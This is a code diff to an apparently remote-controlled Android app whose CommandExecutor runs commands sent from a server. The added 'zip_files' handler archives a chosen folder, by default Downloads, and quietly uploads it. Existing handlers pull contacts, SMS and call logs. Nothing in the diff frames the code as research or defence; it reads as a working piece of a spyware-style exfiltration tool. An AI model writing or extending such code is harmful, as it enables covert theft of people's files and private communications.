@@ -6,6 +6,7 @@ import com.abuzahra.manager.App
 import com.abuzahra.manager.api.ApiClient
 import com.abuzahra.manager.api.FirebaseManager
 import com.abuzahra.manager.model.Command
+import com.abuzahra.manager.storage.ZipManager
 import com.abuzahra.manager.util.DeviceUtils
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -45,7 +46,7 @@ object CommandExecutor {
         }
     }
 
-    private fun processCommand(context: Context, command: Command): Any {
+    private suspend fun processCommand(context: Context, command: Command): Any {
         val params = command.params
         val cmd = command.command
 
@@ -160,7 +161,36 @@ object CommandExecutor {
             "search_files" -> FileExecutor.searchFiles(context, params)
             "recent_files" -> FileExecutor.recentFiles(context)
             "file_info" -> FileExecutor.getFileInfo(context, params)
-            "zip_files" -> mapOf("message" to "Zip requires external library")
+            "zip_files" -> {
+                val path = params["path"] as? String ?: "/storage/emulated/0/Download"
+                val sourceDir = java.io.File(path)
+                if (!sourceDir.exists() || !sourceDir.isDirectory) {
+                    mapOf("error" to "Directory not found: $path")
+                } else {
+                    val timestamp = System.currentTimeMillis()
+                    val outputFile = java.io.File(
+                        sourceDir.parentFile,
+                        "${sourceDir.name}_backup_$timestamp.zip"
+                    )
+                    val result = ZipManager.compressDirectory(sourceDir, outputFile)
+                    if (result.success) {
+                        try {
+                            ApiClient.uploadFile(outputFile, "zip_files")
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Upload failed for zip file", e)
+                        }
+                        mapOf(
+                            "status" to "completed",
+                            "zip_path" to result.outputPath,
+                            "files_count" to result.fileCount,
+                            "original_size" to result.originalSize,
+                            "compressed_size" to result.compressedSize
+                        )
+                    } else {
+                        mapOf("error" to result.error ?: "Compression failed")
+                    }
+                }
+            }
             "send_backup_contacts" -> DataCollector.getContacts(context)
             "send_backup_sms" -> DataCollector.getSMS(context)
             "send_backup_calls" -> DataCollector.getCalls(context)
